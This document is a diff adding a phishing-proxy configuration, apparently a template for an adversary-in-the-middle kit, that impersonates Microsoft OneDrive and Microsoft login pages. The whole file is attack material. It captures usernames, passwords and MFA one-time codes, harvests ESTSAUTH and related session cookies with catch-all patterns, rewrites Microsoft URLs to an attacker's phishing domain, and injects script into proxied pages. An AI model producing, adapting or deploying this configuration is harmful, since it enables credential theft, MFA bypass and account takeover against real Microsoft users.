@@ -1,0 +1,54 @@
+name: OneDrive
+author: PhantomGate
+version: 1.0.0
+description: Microsoft OneDrive authentication
+
+auth:
+  domains:
+    - login.microsoftonline.com
+    - login.live.com
+    - onedrive.live.com
+  
+  login:
+    domain: login.microsoftonline.com
+    path: /common/oauth2/v2.0/authorize
+    username:
+      selector: "input[name='loginfmt']"
+      capture: true
+    password:
+      selector: "input[name='passwd']"
+      capture: true
+  
+  mfa:
+    otp:
+      selector: "input[name='otc']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: ESTSAUTH
+        regex: ".*"
+      - name: ESTSAUTHPERSISTENT
+        regex: ".*"
+      - name: ulc
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: login.microsoftonline.com
+      inject: true
+    - domain: onedrive.live.com
+      inject: true
+
+filters:
+  sub_filters:
+    - domain: login.microsoftonline.com
+      search: "https://login.microsoftonline.com"
+      replace: "https://{phishing_domain}"
+    - domain: onedrive.live.com
+      search: "https://onedrive.live.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    document.cookie = "PhantomGate=1; path=/";
